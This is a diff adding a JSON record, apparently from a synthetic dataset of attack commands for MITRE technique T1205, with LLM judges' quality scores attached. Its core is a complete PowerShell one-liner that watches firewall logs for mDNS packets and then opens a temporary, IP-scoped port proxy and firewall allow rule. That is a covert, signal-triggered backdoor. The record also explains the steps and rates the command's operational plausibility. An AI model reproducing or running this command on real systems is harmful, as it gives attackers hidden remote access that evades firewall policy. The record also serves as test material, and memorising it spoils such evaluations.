@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3}).*\\s5353\\b') { $src=$matches[2]; $name=\"mdns-proxy-$($src.Replace('.','-'))\"; try { netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=10.0.0.5 | Out-Null } catch {} if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8443 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; netsh interface portproxy delete v4tov4 listenport=8443 listenaddress=0.0.0.0 | Out-Null; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+  "explanation": "Uses mDNS (UDP/5353) traffic as a trigger to expose a covert TLS proxy on 8443 (portproxy to 10.0.0.5:443) for the signaling IP only.",
+  "rationale_steps": [
+    "Enable firewall logging",
+    "Detect inbound mDNS packets",
+    "Create a portproxy and matching scoped firewall allow rule",
+    "Schedule automatic teardown"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-cf368335",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced braces/quotes, valid parameters, and parseable pipelines/scriptblocks.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements mDNS-triggered signaling to stand up a scoped 8443→443 portproxy with timed teardown, but it requires administrative rights and local WinRM remoting despite 'Privilege: None', reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.84,
+        "timestamp": "2025-10-01T17:32:33.923880Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced braces and proper pipeline usage, though the double-escaped backslashes (\\b, \\d, \\s) in the regex string suggest the command was serialized/escaped for display rather than direct execution, which could cause regex matching issues at runtime.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1205 Traffic Signaling by monitoring firewall logs for mDNS (UDP/5353) traffic as a covert trigger, then dynamically creating a port proxy to 10.0.0.5:443 and a scoped firewall rule allowing only the signaling source IP to reach port 8443, with a self-cleaning 10-minute TTL — a highly realistic and operationally coherent implementation of traffic-signal-triggered covert C2 channel establishment.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T04:01:43.792283Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed PowerShell script block using valid cmdlets, proper piping, balanced braces, and correct parameter usage for Invoke-Command and netsh.",
+        "semantic_score": 4,
+        "semantic_justification": "The logic perfectly implements the Traffic Signaling technique by monitoring firewall logs for a specific trigger (mDNS) to dynamically open a port; however, the regex uses double-escaped backslashes (e.g., \\\\b, \\\\s, \\\\d) inside a single-quoted string, which in PowerShell results in matching literal backslashes rather than the intended regex meta-characters, likely causing the trigger to fail in practice.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T04:02:00.570882Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
